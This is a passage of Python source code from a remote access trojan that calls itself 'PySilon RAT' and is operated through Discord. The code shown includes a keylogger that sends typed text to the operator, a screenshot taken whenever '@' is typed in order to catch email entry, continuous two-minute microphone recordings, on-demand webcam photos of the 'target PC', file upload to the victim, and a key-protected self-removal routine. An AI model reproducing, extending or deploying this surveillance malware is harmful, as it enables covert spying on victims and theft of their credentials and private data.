                            reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                            message_buffer = cmd_output.split('\n')[line]
                        else:
                            message_buffer += cmd_output.split('\n')[line] + '\n'
                    reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                    reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')

            elif message.content == '.implode':
                await message.delete()
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                expectation = 'key'

            elif message.content[:7] == '.webcam':
                await message.delete()
                if message.content.strip() == '.webcam':
                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[8:] == 'photo':
                        webcam = VideoCapture(0, CAP_DSHOW)
                        result, image = webcam.read()
                        imwrite('webcam.png', image)
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
                        subprocess.run('del webcam.png', shell=True)
                    else:
                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')

            elif expectation == 'key':
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    await message.attachments[0].save(fp=filename)
                    if get_file_hash(filename) == secret_key:
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
                        await reaction_msg.add_reaction('💀')
                        await reaction_msg.add_reaction('🔴')
                        expectation = 'implosion'
                    else:
                        reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
                        expectation = None
                except:
                    await message.channel.send('```❗ Something went wrong while fetching secret key...```')
                    expectation = None

            elif expectation == 'onefile':
                split_v1 = str(message.attachments).split('filename=\'')[1]
                filename = str(split_v1).split('\' ')[0]
                reaction_msg = await message.channel.send('```This file will be uploaded to  ' + '/'.join(working_directory) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
                await reaction_msg.add_reaction('📤')
                await reaction_msg.add_reaction('🔴')
                one_file_attachment_message = message

            elif expectation == 'multiplefiles':
                files_to_merge[1].append(message)

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)

    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)

def start_recording():
    global files_to_send, channel_ids
    while True:
        recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
        sounddevice.wait()
        try: os.mkdir('rec_')
        except: pass
        record_name = 'rec_\\' + current_time() + '.wav'
        write(record_name, 16000, recorded_mic)
        files_to_send.append([channel_ids['recordings'], '', record_name, True])

def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        match processed_key:
            case Key.space: processed_key = ' '
            case Key.shift: processed_key = ' *`SHIFT`*'
            case Key.tab: processed_key = ' *`TAB`*'
            case Key.backspace: processed_key = ' *`<`*'
            case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
            case Key.print_screen|'@':
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

 
with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        try:
            client.run(token)
        except: pass
    listener.join()
